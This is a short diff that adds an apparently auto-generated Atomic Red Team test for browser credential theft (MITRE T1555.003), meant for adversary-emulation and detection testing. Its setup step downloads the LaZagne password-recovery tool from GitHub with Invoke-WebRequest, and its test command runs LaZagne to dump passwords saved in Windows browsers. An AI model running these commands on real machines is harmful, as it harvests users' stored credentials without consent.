@@ -1,0 +1,13 @@
+#TechniqueName: Credentials from Password Stores: Credentials from Web Browsers
+#AtomicTestName: LaZagne - Credentials from Browser
+#Description: The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.&LaZagne is an open source application used to retrieve passwords stored on a local computer. &
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1555.003\bin\LaZagne.exe) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "PathToAtomicsFolder\T1555.003\bin\LaZagne.exe"
+
+
+#commands
+PathToAtomicsFolder\T1555.003\bin\LaZagne.exe browsers
+
